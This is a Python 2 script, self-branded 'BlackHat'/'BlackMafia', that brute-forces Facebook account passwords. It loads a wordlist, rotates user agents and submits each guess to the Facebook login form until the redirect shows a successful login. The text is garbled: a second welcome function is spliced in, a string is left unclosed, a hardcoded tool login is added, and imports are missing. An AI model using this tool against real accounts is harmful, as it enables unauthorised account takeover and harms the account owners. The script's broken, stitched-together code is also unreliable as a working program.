#!/usr/bin/env python			
# -*- coding: UTF-8 -*-			
			
import sys			
import mechanize			
import cookielib			
import random			
			
			
			
			
email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))			
			
			
passwordlist = str(raw_input("Enter the wordlist name and path : "))			
			
			
login = 'https://www.facebook.com/login.php?login_attempt=1'			
			
			
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]			
			
def main():			
	global br		
	br = mechanize.Browser()		
	cj = cookielib.LWPCookieJar()		
	br.set_handle_robots(False)		
	br.set_handle_redirect(True)		
	br.set_cookiejar(cj)		
	br.set_handle_equiv(True)		
	br.set_handle_referer(True)		
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)		
	welcome()		
	search()		
	print("Password does not exist in the wordlist")		
			
			
			
def brute(password):			
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))		
	sys.stdout.flush()		
	br.addheaders = [('User-agent', random.choice(useragents))]		
	site = br.open(login)		
	br.select_form(nr = 0)		
	br.form['email'] = email		
	br.form['pass'] = password		
	sub = br.submit()		
	log = sub.geturl()		
	if log != login and (not 'login_attempt' in log):		
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)
			
			
def search():			
	global password		
	passwords = open(passwordlist,"r")		
	for password in passwords:		
		password = password.replace("\n","")	
		brute(password)	
			
#welcome 			
def welcome():			
	wel = """		
       \033[1;96m  ╭━━━━━━━╮             ╭━━━━━━━╮			
      \033[1;96m   ┃ ●  ══ ┃             ┃  ● ══ ┃ 			
     \033[1;96m    ┃███████┃             ┃███████┃			
    \033[1;96m     ┃███████┃             ┃███████┃			
   \033[1;96m      ┃███████┃             ┃███████┃			
  \033[1;96m       ┃███████┃\033[1;91m>>BlackHat >>\033[1;96m┃███████┃			
   \033[1;96m      ┃███████┃             ┃███████┃			
    \033[1;96m     ┃███████┃             ┃███████┃			
     \033[1;96m    ┃███████┃             ┃███████┃			
     \033[1;96m    ┃███████┃             ┃███████┃			
      \033[1;96m   ┃   ○   ┃             ┃    ○  ┃			
       \033[1;96m  ╰━━━━━━━╯             ╰━━━━━━━╯			
  \033[1;92m:•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;94mWhatsApp Numb\033[1;93m+923094161457\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐ•◈•			
\033[1;95m        ◢▇◣◢▇◣              ◢▇◣◢▇◣			
\033[1;95m	▇▇▇▇▇▇                ▇▇▇▇▇▇		
\033[1;95m	◥▇▇▇▇◤\033[1;96m>>>Lovehacker>>>\033[1;95m◥▇▇▇▇◤		
\033[1;95m         ◥▇▇◤                   ◥▇▇◤         \033[1;92mPakistan			
\033[1;95m          ◥◤		           ◥◤	
\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"""			
#welcome 			
def welcome():			
	wel = """		
			    os.system("clear")									
print
  \033[1;96m-┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈         									
  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈        									
  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   									
 \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   									
 \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈									
 \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈									
  \033[1;96m ─────────────•◈•──────────  									
   \033[1;92m███████▒▒Welcome To BlackMafia▒▒████████									
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mBlackMafia\033[1;95m♡╭──────────•◈•──────────╮♡									
\033[1;94mAuthor\033[1;91m: \033[1;91mlovehacker									
\033[1;94mBlackMafia\033[1;91m: \033[1;91▒▓██████████████]99.9									
\033[1;94mFacebook\033[1;91m: \033[1;91mlovehacker									
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923094161457									
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mBlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"""									
jalan('              \033[1;96m....................BlackMafia.....................:')									
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")									
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')									
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')									
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")									
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")									
print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin BlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"									
									
CorrectUsername = "BlackMafia"									
CorrectPassword = "lovehacker"									
									
loop = 'true'									
while (loop == 'true'):									
    username = raw_input("\033[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")									
    if (username == CorrectUsername):									
    	password = raw_input("\033[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")								
        if (password == CorrectPassword):									
            print "Logged in successfully as " + username #Dev:love_hacker									
	    time.sleep(2)								
            loop = 'false'									
        else:									
            print "\033[1;91mWrong Password"									
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')									
    else:									
        print "\033[1;94mWrong Username"									
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')									
                       	
"" total = open(passwordlist,r")"			
	total = total.readlines()		
	print wel 		
	print " [*] Account to crack : {}".format(email)		
	print " [*] Loaded :" , len(total), "passwords"		
	print " [*] Cracking, please wait ...\n\n"		
			
			
if __name__ == '__main__':			
	main()		
